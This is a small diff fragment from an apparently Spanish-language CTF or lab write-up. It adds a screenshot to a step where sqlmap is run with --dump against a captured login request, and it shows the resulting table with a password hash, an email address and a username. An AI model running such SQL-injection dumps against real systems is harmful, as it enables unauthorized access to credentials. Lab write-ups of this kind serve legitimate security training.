@@ -221,6 +221,8 @@ Entrar en **tricolor.color:8088/index.php.** Hay un login por lo que hacemos los
 sqlmap -r request--batch --dump --level 2 --risk 2
 ```
 
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 105838.png" alt=""><figcaption></figcaption></figure>
+
 ```
 ID | user_pass                         | user_email                  | user_login
 1  | e9d9dcc0e33900c9019f4364361b5597 | smith@hr.trilocor.local     | hr-smith
